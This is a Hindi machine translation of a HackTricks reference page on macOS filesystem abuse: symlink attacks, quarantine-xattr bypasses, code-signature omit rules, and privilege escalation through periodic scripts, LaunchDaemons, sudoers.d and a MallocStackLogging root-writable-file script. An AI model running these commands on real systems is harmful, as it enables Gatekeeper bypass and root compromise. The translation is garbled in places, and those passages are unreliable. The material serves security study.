# macOS FS Tricks

<details>

<summary><strong>जीरो से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* अगर आप अपनी कंपनी की **विज्ञापनित करना चाहते हैं HackTricks** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** द्वारा PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

## POSIX अनुमतियाँ संयोजन

**डायरेक्टरी** में अनुमतियाँ:

* **पढ़ना** - आप **डायरेक्टरी एंट्रीज़ को गणना** कर सकते हैं
* **लिखना** - आप **फ़ाइलें हटा/लिख सकते हैं** डायरेक्टरी में और आप **खाली फ़ोल्डर हटा सकते हैं**।
* लेकिन आप **गैर-खाली फ़ोल्डर हटा/संशोधित नहीं कर सकते** जब तक आपके पास उसके लिए लिखने की अनुमति नहीं है।
* आप **एक फ़ोल्डर का नाम संशोधित नहीं कर सकते** जब तक आप उसके मालिक नहीं हैं।
* **क्रियान्वयन** - आपको **डायरेक्टरी को चौराहा चलने** की अनुमति है - अगर आपके पास यह अधिकार नहीं है, तो आप इसमें किसी भी फ़ाइल तक पहुंच नहीं सकते, या किसी भी उप-डायरेक्टरियों में।

### खतरनाक संयोजन

**कैसे एक फ़ाइल/फ़ोल्डर को ओवरराइट करें जिसका मालिक root है**, लेकिन:

* पथ में एक माता **डायरेक्टरी मालिक** उपयोगकर्ता है
* पथ में एक माता **डायरेक्टरी मालिक** एक **उपयोगकर्ता समूह** है जिसके **लिखने की पहुंच** है
* एक उपयोगकर्ता **समूह** को **फ़ाइल** की **लिखने** की **पहुंच** है

पिछले किसी भी संयोजनों के साथ, एक हमलावर **एक सिम/हार्ड लिंक डाल सकता है** अपेक्षित पथ में एक विशेषाधिकारित अर्बिट्रे लिखने प्राप्त करने के लिए।

### फ़ोल्डर root R+X विशेष मामला

अगर किसी **डायरेक्टरी** में फ़ाइलें हैं जहां **केवल root को R+X पहुंच** है, तो वे **किसी और के लिए पहुंचनीय नहीं हैं**। इसलिए एक भयावहता जो एक उपयोगकर्ता द्वारा पढ़ी जा सकती है, जो उस **प्रतिबंध** के कारण पढ़ी नहीं जा सकती है, इस फ़ोल्डर से **एक अलग फ़ोल्डर में** ले जाने की अनुमति देने वाली एक कमी को उपयोग किया जा सकता है इन फ़ाइलों को पढ़ने के लिए।

उदाहरण: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Symbolic Link / Hard Link

अगर एक विशेषाधिकारित प्रक्रिया **फ़ाइल** में डेटा लिख रही है जो एक **निम्न विशेषाधिकारित उपयोगकर्ता** द्वारा **नियंत्रित किया जा सकता है**, या जो पहले से एक निम्न विशेषाधिकारित उपयोगकर्ता द्वारा बनाई गई हो सकती है। उपयोगकर्ता बस एक सिम्बॉलिक या हार्ड लिंक के माध्यम से इसे दूसरी फ़ाइल पर पॉइंट कर सकता है, और विशेषाधिकारित प्रक्रिया उस फ़ाइल पर लिखेगी।

जांचें अन्य खंडों में कहां एक हमलावर किसी भी अर्बिट्रे लिखने का दुरुपयोग कर सकता है विशेषाधिकारों को उन्नत करने के लिए।

## .fileloc

**`.fileloc`** एक्सटेंशन वाली फ़ाइलें अन्य एप्लिकेशन या बाइनरी की ओर पॉइंट कर सकती हैं ताकि जब वे खोले जाएं, एप्लिकेशन/बाइनरी वह एक्सीक्यूट किया जाए।\
उदाहरण:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## अनियमित एफडी

यदि आप किसी **प्रक्रिया को एक फ़ाइल या फ़ोल्डर को उच्च विशेषाधिकारों के साथ खोलने** के लिए कर सकते हैं, तो आप **`crontab`** का दुरुपयोग कर सकते हैं ताकि `/etc/sudoers.d` में एक फ़ाइल को **`EDITOR=exploit.py`** के साथ खोलें, इस प्रकार `exploit.py` `/etc/sudoers` के अंदर फ़ाइल को प्राप्त करेगा और इसका दुरुपयोग करेगा।

उदाहरण के लिए: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## क्वारंटाइन xattrs ट्रिक्स से बचें

### हटाएं
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable फ्लैग

यदि किसी फ़ाइल/फ़ोल्डर में यह अविकारी गुण है तो उस पर xattr नहीं लगाया जा सकेगा।
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs माउंट

**devfs** माउंट **xattr का समर्थन नहीं करता**, अधिक जानकारी [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html) में मिलेगी।
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### लेखेंटेक्सट्र एसीएल

यह एसीएल फ़ाइल में `xattrs` जोड़ने से रोकता है।
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** फ़ाइल प्रारूप एक फ़ाइल की ACEs के साथ एक फ़ाइल की प्रतिलिपि बनाता है।

[**स्रोत कोड**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) में देखा जा सकता है कि xattr जिसे **`com.apple.acl.text`** कहा जाता है, उसमें संग्रहित ACL प्रतिनिधि डिकंप्रेस फ़ाइल में सेट किया जाएगा। इसलिए, अगर आपने एक एप्लिकेशन को जिप फ़ाइल में AppleDouble फ़ाइल प्रारूप के साथ संकुचित किया है जिसमें एक ACL है जो अन्य xattrs को इसे लिखने से रोकता है... तो quarantine xattr एप्लिकेशन में सेट नहीं हुआ था:

अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) देखें।

इसे प्रतिरूपित करने के लिए हमें पहले सही acl स्ट्रिंग प्राप्त करनी होगी:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that यहाँ तक कि यह सैंडबॉक्स लेखन के पहले quarantine xattr काम करता है)

वास्तव में आवश्यक नहीं है लेकिन मैं यहाँ छोड़ देता हूँ यदि कुछ चाहिए:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## कोड हस्ताक्षर को छोड़ें

बंडल में फ़ाइल **`_CodeSignature/CodeResources`** शामिल है जिसमें **हर एक फ़ाइल** का **हैश** होता है। ध्यान दें कि CodeResources का हैश भी **कृत्रिम** में शामिल है, इसलिए हम उसके साथ खेल नहीं सकते।

हालांकि, कुछ फ़ाइलें हैं जिनकी हस्ताक्षर की जांच नहीं की जाएगी, इनमें plist में छोड़ नामक कुंजी होती है:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
यह संभव है कि CLI से संसाधन की हस्ताक्षर की गणना की जा सके:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## माउंट डीएमजी

एक उपयोगकर्ता एक कस्टम डीएमजी को उसके द्वारा बनाए गए किसी भी मौजूदा फ़ोल्डर के ऊपर भी माउंट कर सकता है। यहाँ एक कस्टम सामग्री के साथ एक कस्टम डीएमजी पैकेज कैसे बनाया जा सकता है:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

## अनियमित लेखन

### आवधिक एसएच स्क्रिप्ट

यदि आपका स्क्रिप्ट **शैल स्क्रिप्ट** के रूप में व्याख्या की जा सकती है, तो आप **`/etc/periodic/daily/999.local`** शैल स्क्रिप्ट को अधिलेखित कर सकते हैं जो प्रतिदिन ट्रिगर होगा।

आप इस स्क्रिप्ट का **नकली** निष्पादन कर सकते हैं: **`sudo periodic daily`**

### डेमन्स

किसी भी **LaunchDaemon** को लिखें जैसे **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** जिसमें एक प्लिस्ट है जो किसी भी स्क्रिप्ट को निष्पादित करता है जैसे:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
### सुडोएर्स फ़ाइल

यदि आपके पास **अनिश्चित लेखन** है, तो आप **`/etc/sudoers.d/`** फ़ोल्डर में एक फ़ाइल बना सकते हैं जिसमें आपको **सुडो** विशेषाधिकार देने के लिए.

### PATH फ़ाइलें

फ़ाइल **`/etc/paths`** PATH env चर में सामग्री डालने के प्रमुख स्थानों में से एक है। इसे ओवरराइट करने के लिए आपको रूट होना चाहिए, लेकिन यदि कोई **विशेषाधिकारी प्रक्रिया** से कोई **पूर्ण पथ के बिना कमांड** चला रहा है, तो आप इसे संशोधित करके उसे **हाइजैक** कर सकते हैं।

आप **`/etc/paths.d`** में भी फ़ाइलें लिख सकते हैं ताकि `PATH` env चर में नए फ़ोल्डर्स लोड किए जा सकें।

## अन्य उपयोगकर्ताओं के रूप में लिखने योग्य फ़ाइलें उत्पन्न करें

यह एक फ़ाइल उत्पन्न करेगा जो रूट का है और मेरे द्वारा लिखने योग्य है ([**यहाँ से कोड**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). यह भी privesc के रूप में काम कर सकता है:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## संदर्भ

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>जीरो से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** हैकट्रिक्स और हैकट्रिक्स क्लाउड github रेपो में PR जमा करके।

</details>
